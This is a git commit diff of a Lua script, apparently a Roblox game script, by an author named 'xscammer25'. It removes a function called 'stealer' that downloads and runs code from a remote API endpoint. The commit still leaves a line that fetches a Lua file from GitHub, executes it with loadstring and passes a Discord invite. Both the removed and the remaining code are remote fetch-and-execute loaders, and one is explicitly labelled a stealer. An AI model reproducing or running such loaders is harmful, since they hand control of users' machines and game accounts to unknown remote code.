5572b7f7b7380facd6a582f1553aed5bfe89e6be
terist999 <xscammer25@gmail.com>
2025-07-22 02:53:34 -0800

    Update New_Project_Reverse.lua

--- New_Project_Reverse.lua
+++ New_Project_Reverse.lua
@@ -1,11 +1,2 @@
-local function stealer()
-
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/QP6PVofSPSnwtcwi/raw", true))()
-end
-local function loadui()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
-
-end
-
-task.spawn(stealer)
-task.spawn(loadui)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
